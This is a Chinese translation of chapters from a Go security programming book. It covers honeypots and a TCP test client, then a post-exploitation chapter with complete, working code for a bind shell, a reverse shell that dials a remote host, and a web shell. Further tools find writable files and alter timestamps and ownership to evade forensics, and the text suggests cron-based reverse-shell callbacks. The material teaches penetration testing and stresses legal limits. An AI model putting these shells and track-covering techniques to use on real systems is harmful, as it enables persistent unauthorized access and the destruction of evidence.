我们在这一部分涵盖了非常基本的例子，以帮助你理解蜜罐的概念，并为你提供一个创建自己更加定制化蜜罐的模板。首先，演示了一个基本的 TCP 套接字蜜罐。这将监听一个端口，并记录任何连接和接收到的数据。为了配合这个例子，提供了一个 TCP 测试工具。它的行为类似于 Netcat 的原始版本，允许你通过标准输入向服务器发送单个消息。这可以用来测试 TCP 蜜罐，或者扩展和用于其他应用程序。最后一个例子是一个 HTTP 蜜罐。它提供了一个登录表单，记录了尝试进行身份验证，但总是返回错误。

确保你了解在你的网络上使用蜜罐的风险。如果你让一个蜜罐持续运行而不保持底层操作系统的更新，你可能会给你的网络增加真正的风险。

# TCP 蜜罐

我们将从一个 TCP 蜜罐开始。它将记录任何接收到的 TCP 连接和来自客户端的任何数据。

它将以身份验证失败的消息进行响应。由于它记录了来自客户端的任何数据，它将记录他们尝试进行身份验证的任何用户名和密码。你可以通过检查他们尝试的身份验证方法来了解他们的攻击方法，因为它就像一个黑匣子，不会给出任何关于它可能使用的身份验证机制的线索。你可以使用日志来查看他们是否将其视为 SMTP 服务器，这可能表明他们是垃圾邮件发送者，或者他们可能正在尝试与数据库进行身份验证，表明他们正在寻找信息。研究攻击者的行为可能非常有见地，甚至可以揭示你之前不知道的漏洞。攻击者可能会在蜜罐上使用服务指纹识别工具，你可能能够识别他们攻击方法中的模式，并找到阻止他们的方法。如果攻击者尝试使用真实的用户凭据登录，那么该用户很可能已经受到了威胁。

这个示例将记录高级请求，比如 HTTP 请求，以及低级连接，比如 TCP 端口扫描。TCP 连接扫描将被记录，但 TCP `SYN`（隐形）扫描将不会被检测到：

```go
package main

import (
   "bytes"
   "log"
   "net"
)

func handleConnection(conn net.Conn) {
   log.Printf("Received connection from %s.\n", conn.RemoteAddr())
   buff := make([]byte, 1024)
   nbytes, err := conn.Read(buff)
   if err != nil {
      log.Println("Error reading from connection. ", err)
   }
   // Always reply with a fake auth failed message
   conn.Write([]byte("Authentication failed."))
   trimmedOutput := bytes.TrimRight(buff, "\x00")
   log.Printf("Read %d bytes from %s.\n%s\n",
      nbytes, conn.RemoteAddr(), trimmedOutput)
   conn.Close()
}

func main() {
   portNumber := "9001" // or os.Args[1]
   ln, err := net.Listen("tcp", "localhost:"+portNumber)
   if err != nil {
       log.Fatalf("Error listening on port %s.\n%s\n",
          portNumber, err.Error())
   }
   log.Printf("Listening on port %s.\n", portNumber)
   for {
      conn, err := ln.Accept()
      if err != nil {
         log.Println("Error accepting connection.", err)
      }
      go handleConnection(conn)
   }
}
```

# TCP 测试工具

为了测试我们的 TCP 蜜罐，我们需要向它发送一些 TCP 流量。我们可以使用任何现有的网络工具，包括 Web 浏览器或 FTP 客户端来攻击蜜罐。一个很好的工具也是 Netcat，TCP/IP 瑞士军刀。不过，我们可以创建自己的简单克隆。它将简单地通过 TCP 读取和写入数据。输入和输出将分别通过标准输入和标准输出进行，允许你使用键盘和终端，或者通过文件和其他应用程序进行数据的输入或输出。

这个工具可以作为一个通用的网络测试工具使用，如果你有任何入侵检测系统或其他监控需要测试，它可能会有用。这个程序将从标准输入中获取数据并通过 TCP 连接发送它，然后读取服务器发送回来的任何数据并将其打印到标准输出。在运行这个示例时，你必须将主机和端口作为一个带有冒号分隔符的字符串传递，就像这样：`localhost:9001`。这是一个简单的 TCP 测试工具的代码：

```go
package main

import (
   "bytes"
   "fmt"
   "log"
   "net"
   "os"
)

func checkArgs() string {
   if len(os.Args) != 2 {
      fmt.Println("Usage: " + os.Args[0] + " <targetAddress>")
      fmt.Println("Example: " + os.Args[0] + " localhost:9001")
      os.Exit(0)
   }
   return os.Args[1]
}

func main() {
   var err error
   targetAddress := checkArgs()
   conn, err := net.Dial("tcp", targetAddress)
   if err != nil {
      log.Fatal(err)
   }
   buf := make([]byte, 1024)

   _, err = os.Stdin.Read(buf)
   trimmedInput := bytes.TrimRight(buf, "\x00")
   log.Printf("%s\n", trimmedInput)

   _, writeErr := conn.Write(trimmedInput)
   if writeErr != nil {
      log.Fatal("Error sending data to remote host. ", writeErr)
   }

   _, readErr := conn.Read(buf)
   if readErr != nil {
      log.Fatal("Error when reading from remote host. ", readErr)
   }
   trimmedOutput := bytes.TrimRight(buf, "\x00")
   log.Printf("%s\n", trimmedOutput)
} 
```

# HTTP POST 表单登录蜜罐

当你在网络上部署这个工具时，除非你是在进行有意的测试，任何表单提交都是一个红旗。这意味着有人试图登录到你的假服务器。由于没有合法的目的，只有攻击者才会有任何理由试图获取访问权限。这里不会有真正的身份验证或授权，只是一个幌子，让攻击者认为他们正在尝试登录。Go HTTP 包在 Go 1.6+中默认支持 HTTP 2。在[`golang.org/pkg/net/http/`](https://golang.org/pkg/net/http/)上阅读更多关于`net/http`包的信息。

以下程序将充当一个带有登录页面的 Web 服务器，只是将表单提交记录到标准输出。你可以运行这个服务器，然后尝试通过浏览器登录，登录尝试将被打印到终端上：

```go
package main 

import (
   "fmt"
   "log"
   "net/http"
)

// Correctly formatted function declaration to satisfy the
// Go http.Handler interface. Any function that has the proper
// request/response parameters can be used to process an HTTP request.
// Inside the request struct we have access to the info about
// the HTTP request and the remote client.
func logRequest(response http.ResponseWriter, request *http.Request) {
   // Write output to file or just redirect output of this 
   // program to file
   log.Println(request.Method + " request from " +  
      request.RemoteAddr + ". " + request.RequestURI)
   // If POST not empty, log attempt.
   username := request.PostFormValue("username")
   password := request.PostFormValue("pass")
   if username != "" || password != "" {
      log.Println("Username: " + username)
      log.Println("Password: " + password)
   }

   fmt.Fprint(response, "<html><body>")
   fmt.Fprint(response, "<h1>Login</h1>")
   if request.Method == http.MethodPost {
      fmt.Fprint(response, "<p>Invalid credentials.</p>")
   }
   fmt.Fprint(response, "<form method=\"POST\">")
   fmt.Fprint(response, 
      "User:<input type=\"text\" name=\"username\"><br>")
   fmt.Fprint(response, 
      "Pass:<input type=\"password\" name=\"pass\"><br>")
   fmt.Fprint(response, "<input type=\"submit\"></form><br>")
   fmt.Fprint(response, "</body></html>")
}

func main() {
   // Tell the default server multiplexer to map the landing URL to
   // a function called logRequest
   http.HandleFunc("/", logRequest)

   // Kick off the listener using that will run forever
   err := http.ListenAndServe(":8080", nil)
   if err != nil {
      log.Fatal("Error starting listener. ", err)
   }
} 
```

# HTTP 表单字段蜜罐

在上一个例子中，我们谈到了创建一个虚假的登录表单来检测有人尝试登录。如果我们想要确定是否是机器人呢？检测机器人尝试登录的能力也可以在生产网站上阻止机器人时派上用场。识别自动化机器人的一种方法是使用蜜罐表单字段。蜜罐表单字段是 HTML 表单上的输入字段，对用户隐藏，并且在表单被人类提交时预期为空白。机器人仍然会在表单中找到蜜罐字段并尝试填写它们。

目标是欺骗机器人，让它们认为表单字段是真实的，同时对用户隐藏。一些机器人会使用正则表达式来寻找关键词，比如`user`或`email`，并只填写这些字段；因此蜜罐字段通常使用名称，比如`email_address`或`user_name`，看起来像一个正常的字段。如果服务器在这些字段接收到数据，它可以假设表单是由机器人提交的。

如果我们在上一个例子中的登录表单中添加一个名为`email`的隐藏表单字段，机器人可能会尝试填写它，而人类则看不到它。表单字段可以使用 CSS 或`input`元素上的`hidden`属性来隐藏。我建议您使用位于单独样式表中的 CSS 来隐藏蜜罐表单字段，因为机器人可以轻松确定表单字段是否具有`hidden`属性，但要更难检测到输入是否使用样式表隐藏。

# 沙盒

一个相关的技术，本章没有演示，但值得一提的是沙盒。沙盒的目的与蜜罐不同，但它们都努力创建一个看起来合法的环境，实际上是严格受控和监视的。沙盒的一个例子是创建一个没有网络连接的虚拟机，记录所有文件更改和尝试的网络连接，以查看是否发生了可疑事件。

有时，沙盒环境可以通过查看 CPU 数量和内存来检测。如果恶意应用程序检测到资源较少的系统，比如 1 个 CPU 和 1GB 内存，那么它可能不是现代桌面机器，可能是一个沙盒。恶意软件作者已经学会了对沙盒环境进行指纹识别，并编程应用程序，以绕过任何恶意操作，如果它怀疑自己在沙盒中运行。

# 总结

阅读完本章后，您现在应该了解社会工程的一般概念，并能够提供一些例子。您应该了解如何使用 JSON 与 REST API 交互，生成 QR 码和 base64 编码数据，以及使用 SMTP 发送电子邮件。您还应该能够解释蜜罐的概念，并了解如何实现自己的蜜罐或扩展这些例子以满足自己的需求。

你还能想到哪些其他类型的蜜罐？哪些常见服务经常受到暴力破解或攻击？你如何定制或扩展社会工程的例子？你能想到其他可以用于信息收集的服务吗？

在下一章中，我们将涵盖后期利用的主题，比如部署绑定 shell、反向绑定 shell 或 Web shell；交叉编译；查找可写文件；以及修改文件时间戳、权限和所有权。


# 第十三章：后渗透

后渗透指的是渗透测试的阶段，其中一台机器已经被利用并且可以执行代码。主要任务通常是保持持久性，以便您可以保持连接活动或留下重新连接的方式。本章涵盖了一些常见的持久性技术；即绑定 shell、反向绑定 shell 和 Web shell。我们还将研究交叉编译，在从单个主机编译不同操作系统的 shell 时非常有帮助。

后渗透阶段的其他目标包括查找敏感数据，对文件进行更改，并隐藏您的踪迹，以便取证调查人员无法找到证据。您可以通过更改文件的时间戳、修改权限、禁用 shell 历史记录和删除日志来掩盖您的踪迹。本章涵盖了一些查找有趣文件和掩盖踪迹的技术。

第四章，*取证*，与本章密切相关，因为进行取证调查与探索新被利用的机器并无太大不同。两项任务都是关于了解系统上有什么并找到有趣的文件。同样，第五章，*数据包捕获和注入*，对于从被利用的主机进行网络分析非常有用。在这个阶段，诸如查找大文件或查找最近修改的文件等工具也非常有用。请参考第四章，*取证*，和第五章，*数据包捕获和注入*，以获取更多可在后渗透阶段使用的示例。

后渗透阶段涵盖了各种任务，包括提权、枢纽、窃取或销毁数据，以及主机和网络分析。由于范围如此广泛，并且根据您所利用的系统类型而变化，本章重点关注应该在大多数情况下有用的一系列主题。

在进行这些练习时，尝试从攻击者的角度看待事物。在处理示例时采用这种心态将有助于您了解如何更好地保护您的系统。

在这一章中，我们将涵盖以下主题：

+   交叉编译

+   绑定 shell

+   反向绑定 shell

+   Web shell

+   查找具有写权限的文件

+   修改文件时间戳

+   修改文件权限

+   修改文件所有权

# 交叉编译

交叉编译是 Go 提供的一个非常易于使用的功能。如果您正在 Linux 机器上执行渗透测试，并且需要编译一个在您已经攻陷的 Windows 机器上运行的自定义反向 shell，这将非常有用。

您可以针对多种架构和操作系统，而您需要做的只是修改一个环境变量。无需任何额外的工具或编译器。Go 中已经内置了一切。

只需更改`GOARCH`和`GOOS`环境变量以匹配您所需的构建目标。您可以构建 Windows、Mac、Linux 等系统。您还可以为主流的 32 位和 64 位桌面处理器以及树莓派等设备的 ARM 和 MIPS 构建。

截至目前，`GOARCH`的可能值如下：

| `386` | `amd64` |
| --- | --- |
| `amd64p32` | `arm` |
| `armbe` | `arm64` |
| `arm64be` | `ppc64` |
| `ppc64le` | `mips` |
| `mipsle` | `mips64` |
| `mips64le` | `mips64p32` |
| `mips64p32le` | `ppc` |
| `s390` | `s390x` |
| `sparc` | `sparc64` |

`GOOS`的选项如下：

| `android` | `darwin` |
| --- | --- |
| `dragonfly` | `freebsd` |
| `linux` | `nacl` |
| `netbsd` | `openbsd` |
| `plan9` | `solaris` |
| `windows` | `zos` |

请注意，并非每种架构都可以与每种操作系统一起使用。请参考 Go 官方文档([`golang.org/doc/install/source#environment`](https://golang.org/doc/install/source#environment))，了解可以组合哪些架构和操作系统。

如果你的目标是 ARM 平台，你可以通过设置`GOARM`环境变量来指定 ARM 版本。系统会自动选择一个合理的默认值，建议你不要更改。在撰写本文时，可能的`GOARM`值为`5`、`6`和`7`。

在 Windows 中，在命令提示符中设置环境变量，如下所示：

```go
Set GOOS=linux
Set GOARCH=amd64
go build myapp
```

在 Linux/Mac 中，你也可以以多种方式设置环境变量，但你可以像这样为单个构建命令指定它：

```go
GOOS=windows GOARCH=amd64 go build mypackage  
```

在[`golang.org/doc/install/source#environment`](https://golang.org/doc/install/source#environment)了解更多关于环境变量和交叉编译的内容。

这种交叉编译方法是在 Go 1.5 中引入的。在那之前，Go 开发人员提供了一个 shell 脚本，但现在不再支持，它被存档在[`github.com/davecheney/golang-crosscompile/tree/archive`](https://github.com/davecheney/golang-crosscompile/tree/archive)。

# 创建绑定 shell

绑定 shell 是绑定到端口并监听连接并提供 shell 的程序。每当收到连接时，它运行一个 shell，比如 Bash，并将标准输入、输出和错误处理传递给远程连接。它可以永久监听并为多个传入连接提供 shell。

绑定 shell 在你想要为机器添加持久访问时非常有用。你可以运行绑定 shell，然后断开连接，或者通过远程代码执行漏洞将绑定 shell 注入内存。

绑定 shell 的最大问题是防火墙和 NAT 路由可能会阻止直接远程访问计算机。传入连接通常会被阻止或以一种阻止连接到绑定 shell 的方式路由。因此，通常使用反向绑定 shell。下一节将介绍反向绑定 shell。

在 Windows 上编译这个示例，结果为 1,186 字节。考虑到一些用 C/Assembly 编写的 shell 可能不到 100 字节，这可能被认为是相对较大的。如果你要利用一个应用程序，你可能只有非常有限的空间来注入绑定 shell。你可以通过省略`log`包、删除可选的命令行参数和忽略错误来使示例更小。

可以使用 TLS 来替代明文，方法是用`tls.Listen()`替换`net.Listen()`。第六章，*密码学*，有一个 TLS 客户端和服务器的示例。

接口是 Go 语言的一个强大特性，这里通过读取器和写入器接口展示了它的便利性。满足读取器和写入器接口的唯一要求是分别为该类型实现`.Read()`和`.Write()`函数。在这里，网络连接实现了`Read()`和`Write()`函数，`exec.Command`也是如此。由于它们实现的共享接口，我们可以轻松地将读取器和写入器接口绑定在一起。

在下一个示例中，我们将看看如何为 Linux 创建一个使用内置的`/bin/sh` shell 的绑定 shell。它将绑定并监听连接，为任何连接提供 shell：

```go
// Call back to a remote server and open a shell session
package main

import (
   "fmt"
   "log"
   "net"
   "os"
   "os/exec"
)

var shell = "/bin/sh"

func main() {
   // Handle command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Usage: " + os.Args[0] + " <bindAddress>")
      fmt.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")
      os.Exit(1)
   }

   // Bind socket
   listener, err := net.Listen("tcp", os.Args[1])
   if err != nil {
      log.Fatal("Error connecting. ", err)
   }
   log.Println("Now listening for connections.")

   // Listen and serve shells forever
   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Println("Error accepting connection. ", err)
      }
      go handleConnection(conn)
   }

}

// This function gets executed in a thread for each incoming connection
func handleConnection(conn net.Conn) {
   log.Printf("Connection received from %s. Opening shell.", 
   conn.RemoteAddr())
   conn.Write([]byte("Connection established. Opening shell.\n"))

   // Use the reader/writer interface to connect the pipes
   command := exec.Command(shell)
   command.Stdin = conn
   command.Stdout = conn
   command.Stderr = conn
   command.Run()

   log.Printf("Shell ended for %s", conn.RemoteAddr())
} 
```

# 创建反向绑定 shell

反向绑定 shell 克服了防火墙和 NAT 的问题。它不是监听传入连接，而是向远程服务器（你控制并监听的服务器）拨号。当你在自己的机器上收到连接时，你就有了一个在防火墙后面的计算机上运行的 shell。

这个示例使用明文 TCP 套接字，但你可以很容易地用`tls.Dial()`替换`net.Dial()`。第六章，*密码学*，有 TLS 客户端和服务器的示例，如果你想修改这些示例来使用 TLS。

```go
// Call back to a remote server and open a shell session
package main

import (
   "fmt"
   "log"
   "net"
   "os"
   "os/exec"
)

var shell = "/bin/sh"

func main() {
   // Handle command line arguments
   if len(os.Args) < 2 {
      fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
      fmt.Println("Example: " + os.Args[0] + " 192.168.0.27:9999")
      os.Exit(1)
   }

   // Connect to remote listener
   remoteConn, err := net.Dial("tcp", os.Args[1])
   if err != nil {
      log.Fatal("Error connecting. ", err)
   }
   log.Println("Connection established. Launching shell.")

   command := exec.Command(shell)
   // Take advantage of reader/writer interfaces to tie inputs/outputs
   command.Stdin = remoteConn
   command.Stdout = remoteConn
   command.Stderr = remoteConn
   command.Run()
} 
```

# 创建 Web shell

Web shell 类似于绑定 shell，但是它不是作为原始 TCP 套接字进行监听和通信，而是作为 HTTP 服务器进行监听和通信。这是一种创建对机器持久访问的有用方法。

Web shell 可能是必要的一个原因是防火墙或其他网络限制。HTTP 流量可能会与其他流量有所不同。有时，`80`和`443`端口是防火墙允许的唯一端口。一些网络可能会检查流量，以确保只有 HTTP 格式的请求被允许通过。

请记住，使用纯 HTTP 意味着流量可以以纯文本形式记录。可以使用 HTTPS 加密流量，但 SSL 证书和密钥将驻留在服务器上，因此服务器管理员将可以访问它。要使此示例使用 SSL，只需将`http.ListenAndServe()`更改为`http.ListenAndServeTLS()`。第九章中提供了此示例，*Web 应用程序*。

Web shell 的便利之处在于您可以使用任何 Web 浏览器和命令行工具，例如`curl`或`wget`。您甚至可以使用`netcat`并手动创建 HTTP 请求。缺点是您没有真正的交互式 shell，并且一次只能发送一个命令。如果使用分号分隔多个命令，可以在一个字符串中运行多个命令。

您可以像这样手动创建`netcat`或自定义 TCP 客户端的 HTTP 请求：

```go
GET /?cmd=whoami HTTP/1.0\n\n  
```

这将类似于由 Web 浏览器创建的请求。例如，如果您运行`webshell localhost:8080`，您可以访问端口`8080`上的 URL，并使用`http://localhost:8080/?cmd=df`运行命令。

请注意，`/bin/sh` shell 命令适用于 Linux 和 Mac。Windows 使用`cmd.exe`命令提示符。在 Windows 中，您可以启用 Windows 子系统并从 Windows 商店安装 Ubuntu，以在不安装虚拟机的情况下在 Linux 环境中运行所有这些 Linux 示例。

在下一个示例中，Web shell 创建一个简单的 Web 服务器，通过 HTTP 监听请求。当它收到请求时，它会查找名为`cmd`的`GET`查询。它将执行一个 shell，运行提供的命令，并将结果作为 HTTP 响应返回：

```go
package main

import (
   "fmt"
   "log"
   "net/http"
   "os"
   "os/exec"
)

var shell = "/bin/sh"
var shellArg = "-c"

func main() {
   if len(os.Args) != 2 {
      fmt.Printf("Usage: %s <listenAddress>\n", os.Args[0])
      fmt.Printf("Example: %s localhost:8080\n", os.Args[0])
      os.Exit(1)
   }

   http.HandleFunc("/", requestHandler)
   log.Println("Listening for HTTP requests.")
   err := http.ListenAndServe(os.Args[1], nil)
   if err != nil {
      log.Fatal("Error creating server. ", err)
   }
}

func requestHandler(writer http.ResponseWriter, request *http.Request) {
   // Get command to execute from GET query parameters
   cmd := request.URL.Query().Get("cmd")
   if cmd == "" {
      fmt.Fprintln(
         writer,
         "No command provided. Example: /?cmd=whoami")
      return
   }

   log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)
   fmt.Fprintf(writer, "You requested command: %s\n", cmd)

   // Run the command
   command := exec.Command(shell, shellArg, cmd)
   output, err := command.Output()
   if err != nil {
      fmt.Fprintf(writer, "Error with command.\n%s\n", err.Error())
   }

   // Write output of command to the response writer interface
   fmt.Fprintf(writer, "Output: \n%s\n", output)
} 
```

# 查找可写文件

一旦您获得对系统的访问权限，您就会开始探索。通常，您会寻找提升权限或保持持久性的方法。寻找持久性方法的一个好方法是识别哪些文件具有写权限。

您可以查看文件权限设置，看看您或其他人是否具有写权限。您可以明确寻找`777`等模式，但更好的方法是使用位掩码，专门查看写权限位。

权限由几个位表示：用户权限，组权限，最后是每个人的权限。`0777`权限的字符串表示看起来像这样：`-rwxrwxrwx`。我们感兴趣的位是给每个人写权限的位，由`--------w-`表示。

第二位是我们关心的唯一位，因此我们将使用按位与运算符将文件的权限与`0002`进行掩码。如果该位已设置，它将保持为唯一设置的位。如果关闭，则保持关闭，整个值将为`0`。要检查组或用户的写位，可以分别使用按位与运算符`0020`和`0200`。

要在目录中进行递归搜索，Go 提供了标准库中的`path/filepath`包。此函数只需一个起始目录和一个函数。它对找到的每个文件执行该函数。它期望的函数实际上是一个特别定义的类型。它的定义如下：

```go
type WalkFunc func(path string, info os.FileInfo, err error) error  
```

只要创建一个与此格式匹配的函数，您的函数就与`WalkFunc`类型兼容，并且可以在`filepath.Walk()`函数中使用。

在下一个示例中，我们将遍历一个起始目录并检查每个文件的文件权限。我们还将涵盖子目录。任何当前用户可写的文件都将打印到标准输出：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "path/filepath"
)

func main() {
   if len(os.Args) != 2 {
      fmt.Println("Recursively look for files with the " + 
         "write bit set for everyone.")
      fmt.Println("Usage: " + os.Args[0] + " <path>")
      fmt.Println("Example: " + os.Args[0] + " /var/log")
      os.Exit(1)
   }
   dirPath := os.Args[1]

   err := filepath.Walk(dirPath, checkFilePermissions)
   if err != nil {
      log.Fatal(err)
   }
}

func checkFilePermissions(
   path string,
   fileInfo os.FileInfo,
   err error,
) error {
   if err != nil {
      log.Print(err)
      return nil
   }

   // Bitwise operators to isolate specific bit groups
   maskedPermissions := fileInfo.Mode().Perm() & 0002
   if maskedPermissions == 0002 {
      fmt.Println("Writable: " + fileInfo.Mode().Perm().String() + 
         " " + path)
   }

   return nil
} 
```

# 更改文件时间戳

以相同的方式，您可以修改文件权限，也可以修改时间戳，使其看起来像是在过去或未来修改过。这对于掩盖您的行踪并使其看起来像是很长时间没有被访问的文件，或者设置为将来的日期以混淆取证人员可能很有用。Go `os`包包含了修改文件的工具。

在下一个示例中，文件的时间戳被修改以看起来像是在未来修改过。您可以调整`futureTime`变量，使文件看起来已经修改到任何特定时间。该示例通过在当前时间上添加 50 小时 15 分钟来提供相对时间，但您也可以指定绝对时间：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "time"
)

func main() {
   if len(os.Args) != 2 {
      fmt.Printf("Usage: %s <filename>", os.Args[0])
      fmt.Printf("Example: %s test.txt", os.Args[0])
      os.Exit(1)
   }

   // Change timestamp to a future time
   futureTime := time.Now().Add(50 * time.Hour).Add(15 * time.Minute)
   lastAccessTime := futureTime
   lastModifyTime := futureTime
   err := os.Chtimes(os.Args[1], lastAccessTime, lastModifyTime)
   if err != nil {
      log.Println(err)
   }
} 
```

# 更改文件权限

更改文件权限以便以后可以从低权限用户访问文件也可能很有用。该示例演示了如何使用`os`包更改文件权限。您可以使用`os.Chmod()`函数轻松更改文件权限。

该程序命名为`chmode.go`，以避免与大多数系统提供的默认`chmod`程序发生冲突。它具有与`chmod`相同的基本功能，但没有任何额外功能。

`os.Chmod()`函数很简单，但必须提供`os.FileMode`类型。`os.FileMode`类型只是一个`uint32`类型，因此您可以提供一个`uint32`文字（硬编码数字），或者您必须确保您提供的文件模式值被转换为`os.FileMode`类型。在这个示例中，我们将从命令行提供的字符串值（例如，`"777"`）转换为无符号整数。我们将告诉`strconv.ParseUint()`将其视为 8 进制数而不是 10 进制数。我们还为`strconv.ParseUint()`提供了一个 32 的参数，以便我们得到一个 32 位的数字而不是 64 位的数字。在我们从字符串值获得一个无符号 32 位整数之后，我们将其转换为`os.FileMode`类型。这就是标准库中`os.FileMode`的定义方式：

```go
type FileMode uint32  
```

在下一个示例中，文件的权限将更改为作为命令行参数提供的值。它类似于 Linux 中的`chmod`程序，并以八进制格式接受权限：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "strconv"
)

func main() {
   if len(os.Args) != 3 {
      fmt.Println("Change the permissions of a file.")
      fmt.Println("Usage: " + os.Args[0] + " <mode> <filepath>")
      fmt.Println("Example: " + os.Args[0] + " 777 test.txt")
      fmt.Println("Example: " + os.Args[0] + " 0644 test.txt")
      os.Exit(1)
   }
   mode := os.Args[1]
   filePath := os.Args[2]

   // Convert the mode value from string to uin32 to os.FileMode
   fileModeValue, err := strconv.ParseUint(mode, 8, 32)
   if err != nil {
      log.Fatal("Error converting permission string to octal value. ", 
         err)
   }
   fileMode := os.FileMode(fileModeValue)

   err = os.Chmod(filePath, fileMode)
   if err != nil {
      log.Fatal("Error changing permissions. ", err)
   }
   fmt.Println("Permissions changed for " + filePath)
} 
```

# 更改文件所有权

该程序将获取提供的文件并更改用户和组所有权。这可以与查找您有权限修改的文件的示例一起使用。

Go 在标准库中提供了`os.Chown()`，但它不接受用户和组名称的字符串值。用户和组必须以整数 ID 值提供。幸运的是，Go 还带有一个`os/user`包，其中包含根据名称查找 ID 的函数。这些函数是`user.Lookup()`和`user.LookupGroup()`。

您可以使用`id`、`whoami`和`groups`命令在 Linux/Mac 上查找自己的用户和组信息。

请注意，这在 Windows 上不起作用，因为所有权的处理方式不同。以下是此示例的代码实现：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "os/user"
   "strconv"
)

func main() {
   // Check command line arguments
   if len(os.Args) != 4 {
      fmt.Println("Change the owner of a file.")
      fmt.Println("Usage: " + os.Args[0] + 
         " <user> <group> <filepath>")
      fmt.Println("Example: " + os.Args[0] +
         " dano dano test.txt")
      fmt.Println("Example: sudo " + os.Args[0] + 
         " root root test.txt")
      os.Exit(1)
   }
   username := os.Args[1]
   groupname := os.Args[2]
   filePath := os.Args[3]

   // Look up user based on name and get ID
   userInfo, err := user.Lookup(username)
   if err != nil {
      log.Fatal("Error looking up user "+username+". ", err)
   }
   uid, err := strconv.Atoi(userInfo.Uid)
   if err != nil {
      log.Fatal("Error converting "+userInfo.Uid+" to integer. ", err)
   }

   // Look up group name and get group ID
   group, err := user.LookupGroup(groupname)
   if err != nil {
      log.Fatal("Error looking up group "+groupname+". ", err)
   }
   gid, err := strconv.Atoi(group.Gid)
   if err != nil {
      log.Fatal("Error converting "+group.Gid+" to integer. ", err)
   }

   fmt.Printf("Changing owner of %s to %s(%d):%s(%d).\n",
      filePath, username, uid, groupname, gid)
   os.Chown(filePath, uid, gid)
} 
```

# 摘要

阅读完本章后，您现在应该对攻击的后期利用阶段有了高层次的理解。通过实例的操作并扮演攻击者的心态，您应该对如何保护您的文件和网络有了更好的理解。这主要是关于持久性和信息收集。您还可以使用被攻击的机器执行来自第十一章 *主机发现和枚举*的所有示例。

绑定 shell、反向绑定 shell 和 Web shell 是攻击者用来保持持久性的技术示例。即使你永远不需要使用绑定 shell，了解它以及攻击者如何使用它是很重要的，如果你想识别恶意行为并保持系统安全。你可以使用第十一章中的端口扫描示例，*主机发现和枚举*，来搜索具有监听绑定 shell 的机器。你可以使用第五章中的数据包捕获和注入来查找传出的反向绑定 shell。

找到可写文件可以为你提供浏览文件系统所需的工具。`Walk()`函数演示非常强大，可以适应许多用例。你可以轻松地将其调整为搜索具有不同特征的文件。例如，也许你想将搜索范围缩小到查找由 root 拥有但对你也可写的文件，或者你想找到特定扩展名的文件。

你刚刚获得访问权限的机器上还有什么其他东西会吸引你的注意吗？你能想到其他任何重新获得访问权限的方法吗？Cron 作业是一种可以执行代码的方法，如果你找到一个执行你有写权限的脚本的 cron 作业。如果你能修改一个 cron 脚本，那么你可能会每天都有一个反向 shell 呼叫你，这样你就不必维持一个活跃的会话，使用像`netstat`这样的工具更容易找到已建立的连接。

记住，无论何时进行测试或执行渗透测试都要负责任。即使你有完整的范围，你也必须理解你所采取的任何行动可能带来的后果。例如，如果你为客户执行渗透测试，并且你有完整的范围，你可能会在生产系统上发现一个漏洞。你可能考虑安装一个绑定 shell 后门来证明你可以保持持久性。如果我们考虑一个面向互联网的生产服务器，将一个绑定 shell 开放给整个互联网而没有加密和密码是非常不负责任的。如果你对某些软件或某些命令的后果感到不确定，不要害怕向有经验的人求助。

在下一章中，我们将回顾你在本书中学到的主题。我将提供一些关于使用 Go 进行安全性的思考，希望你能从本书中获得，并且我们将讨论接下来该做什么以及在哪里寻求帮助。我们还将再次反思使用本书信息涉及的法律、道德和技术边界。


# 第十四章：结论

# 总结你学到的主题

到目前为止，在这本书中，我们涵盖了关于 Go 和信息安全的许多主题。涵盖的主题对各种人都有用，包括开发人员、渗透测试人员、SOC 分析师、计算机取证分析师、网络和安全工程师以及 DevOps 工程师。以下是涵盖的主题的高层回顾：

+   Go 编程语言

+   处理文件

+   取证

+   数据包捕获和注入

+   密码学

+   安全外壳（SSH）

+   暴力破解

+   Web 应用程序

+   Web 抓取

+   主机发现和枚举

+   社会工程和蜜罐

+   后渗透

# 关于 Go 的更多想法

Go 是一种很棒的语言，对于许多用例来说是一个可靠的选择，但和其他语言一样，并不是万能的语言。正如古话所说，“永远选择最适合的工具。”在整本书中，我们看到了 Go 和标准库的多才多艺。Go 在性能、生产可靠性、并发性和内存使用方面也很出色，但强大的静态类型系统可能会减慢开发速度，使得 Python 在简单概念验证方面更好。有趣的是，你可以通过用 Go 编写 Python 模块来扩展 Python。

在某些情况下，当你不想要垃圾收集器但需要编译最小的二进制文件时，C 编程语言可能是更好的选择。Go 确实提供了一个不安全的包，允许你绕过类型安全，但它并不像 C 语言那样提供那么多控制。Go 允许你包装 C 库并创建绑定，以便你可以利用任何没有 Go 等效的 C 库。

Go 和网络安全行业都显示出增长的迹象。Go 作为一种语言正在不断发展，语言的一些薄弱领域也开始出现有希望的迹象。例如，GUI 库（如 Qt 和 Gtk）正在被 Go 包装，而具有 3D 图形库（如 OpenGL）也有包装器。甚至移动开发也是可能的，并且不断改进。

标准库中还有其他有用的包，我们甚至没有涵盖，比如用于操作二进制数据的`binary`包，用于编码和解码 XML 文档的`xml`包，以及用于解析命令行参数的`flag`包。

# 我希望你从这本书中学到的东西

阅读完这本书后，你应该对标准库中提供的包有一个很好的了解，并且知道 Go 在开箱即用时有多么多才多艺。你应该可以放心地使用 Go 来完成各种任务，从简单的任务，比如处理文件和建立网络连接，到更高级的任务，比如抓取网站和捕获数据包。我还希望你能从中获得一些编写符合惯用法的 Go 代码的技巧。

提供的示例程序应该作为构建自己工具的参考。许多程序可以直接使用，并立即纳入你的工具包，而有些只是作为参考，帮助你执行常见任务。

# 注意法律、道德和技术边界

对于你对计算机或网络采取的任何行动，了解可能的后果至关重要。根据法律和司法管辖区的不同，可能会有法律边界，导致罚款或监禁。例如，在美国，《计算机欺诈和滥用法》（CFAA）使未经授权访问计算机成为非法行为。不要总是假设授权你进行渗透测试范围的客户有权授权你访问每台设备。公司可以租用物理服务器或在数据中心租用虚拟或物理空间，而这些设备并非所有权，因此你需要从其他来源获取授权。

